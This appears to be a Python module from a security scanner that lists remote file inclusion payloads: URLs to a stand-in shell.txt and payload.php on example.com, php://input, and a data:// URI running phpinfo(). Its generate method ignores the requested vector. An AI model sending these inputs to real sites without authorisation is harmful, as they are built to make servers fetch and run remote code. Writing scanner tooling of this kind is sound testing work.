"""
===============================================================================
Remote File Inclusion Payloads
===============================================================================
"""

from __future__ import annotations

from itertools import chain
from typing import Iterable


HTTP_PAYLOADS = (

    "http://example.com/shell.txt",

    "https://example.com/payload.php",

)

FTP_PAYLOADS = (

    "ftp://example.com/file.txt",

)

WRAPPER_PAYLOADS = (

    "php://input",

    "data://text/plain,<?php phpinfo();?>",

)

PAYLOAD_DATABASE = {

    "http": HTTP_PAYLOADS,

    "ftp": FTP_PAYLOADS,

    "wrapper": WRAPPER_PAYLOADS,

}


class RFIPayloadProvider:

    def generate(
        self,
        vector,
    ) -> Iterable[str]:

        return chain.from_iterable(
            PAYLOAD_DATABASE.values()
        )